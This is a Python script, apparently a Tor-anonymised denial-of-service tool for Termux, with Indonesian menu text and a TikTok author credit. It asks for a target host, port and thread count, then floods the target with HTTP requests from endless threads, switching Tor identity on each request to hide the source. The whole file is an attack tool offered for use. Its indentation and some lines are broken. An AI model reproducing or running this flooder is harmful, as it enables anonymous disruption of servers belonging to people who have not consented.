import socket
import threading
import os
import socks
import stem.process
from stem.control import Controller

# Install dependency jika belum ada

os.system("pkg install python -y")
os.system("pkg install tor -y")

# Konfigurasi TOR agar mengganti IP setiap request

def change_ip():
with Controller.from_port(port=9051) as controller:
controller.authenticate()
controller.signal(stem.Signal.NEWNYM)

Konfigurasi proxy TOR

socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket

def menu():
print("""

👤 Username : Not logged in yet
📡 Mode : Public access
🌐 Author account :  Tik tok @stc_fay
✧━━━━━━━━━[ Menu ]━━━━━━━━━━✧


Mulai serangan

Keluar



✧━━━━━━━[ Thank You ]━━━━━━━━✧
""")
choice = input("Pilih opsi: ")
if choice == "1":
start_attack()
elif choice == "2":
print("Keluar...")
print("Follow me on TikTok @stc_fay")
exit()
else:
print("Pilihan tidak valid!")
menu()

def start_attack():
target = input("Masukkan IP atau domain target: ")
port = int(input("Masukkan port (default 80): ") or 80)
threads = int(input("Masukkan jumlah thread: ") or 100)

print(f"Menyerang {target} di port {port} dengan {threads} thread secara anonim...")

def attack():
    while True:
        try:
            change_ip()  # Ganti IP setiap request
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(b"GET / HTTP/1.1\r\n", (target, port))
            s.sendto(b"Host: " + target.encode() + b"\r\n\r\n", (target, port))
            s.close()
        except Exception as e:
            print(f"Error: {e}")

for _ in range(threads):
    thread = threading.Thread(target=attack)
    thread.start()


if name == "main":
menu()

